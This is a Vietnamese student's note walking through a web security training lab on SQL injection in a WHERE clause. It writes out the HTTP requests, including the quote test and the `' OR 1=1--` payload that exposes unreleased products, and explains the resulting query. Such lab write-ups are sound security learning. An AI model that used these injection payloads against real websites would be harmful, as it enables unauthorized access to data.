![[lab-sqli-hidden-data.png]]
Lab WHERE clause, chèn vào category để lụm hàng chưa release.

> [!NOTE] phân tích đề
> - query gốc kiểu `SELECT ... WHERE category='Gifts' AND released=1`.
> - mình control được `category`.
> -sau khi quan sát gói tin category Gifts này, mình thấy response chỉ hiện hàng đã release, tức query còn kẹt điều kiện `released=1`, nên mình chèn `OR 1=1` để phá nó.
> - liên quan [[lys thuyet sql injection]] và [[các kỹ thuật chèn sql]].

### hướng giải
- [ ] mở shop, bấm category Gifts, intercept.
- [ ] gửi Repeater với `category=Gifts`.
- [ ] chèn `'` test lỗi.
- [ ] chèn `' OR 1=1--` để bypass `released=1`.
- [ ] verify có thêm sản phẩm unreleased.

### giải
request gốc:
```
GET /filter?category=Gifts HTTP/1.1
Host: xxx.web-security-academy.net
```
-> chỉ thấy hàng released.

request test:
```
GET /filter?category=Gifts' HTTP/1.1
```
-> 500 lỗi SQL.
=> dính SQLi.

payload chốt:
```
GET /filter?category=Gifts' OR 1=1-- HTTP/1.1
```
query thành:
```sql
SELECT * FROM products WHERE category='Gifts' OR 1=1--' AND released=1
```
-> `--` comment hết đuôi.
-> `OR 1=1` luôn đúng.
=> response hiện thêm hàng unreleased.
-> lab báo solved.

> [!NOTE] bài học
> - WHERE + AND released=1 là pattern kinh điển.
> - `OR 1=1--` là mở bát.
> - sau bài này qua [[Lab-SQLi login bypass]].
